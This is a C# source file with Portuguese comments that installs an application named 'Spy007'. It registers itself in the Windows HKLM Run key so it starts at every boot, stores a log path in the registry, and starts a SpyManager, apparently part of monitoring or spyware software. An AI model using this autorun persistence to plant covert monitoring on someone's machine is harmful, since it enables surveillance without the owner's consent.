using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Spy007;

namespace SpyApplication.Controler
{
    class SystemControler
    {
        static string spypath = null;
        static Form appForm = new Form1();

        public static void Configurar()
        {
            try {
                // Verfifica se a App foi Registrada
                RegistryKey registro = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                registro.GetValue("spy007").ToString();

                //Instancia o Spy007
                SpyManager.Instance.Start();
            } catch (Exception) {
                //Caso a App nao tenha sido instalada, abre o Instalador
                appForm.Show();
            }
        }

        public static void Instalar(String path)
        {
            //Cria referencia com a chave de registro para Autorun App
            RegistryKey registro = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registro.SetValue("spy007", Application.ExecutablePath.ToString());

            //Recebe o caminho dos logs definido pelo usuario
            spypath = path;

            //Verifica se ja foi registrado
            if (registro.GetValue("spy007") != null) {
                    // Cria uma referência pra a localizacao do Arquivo.XML
                    RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE", true);
                    // cria um Subchave (Pasta) como o nome Spy007
                    registro = rk.CreateSubKey("Spy007");
                    // grava o caminho na SubChave GravaRegistro
                    registro.SetValue("spypath", spypath);
                    // fecha a Chave de Restistro registro
                    registro.Close();
            } else throw new Exception("Spy007 Ja foi Instalado!");

            //Instancia o Spy007
            SpyManager.Instance.Start();
        }
    }
}
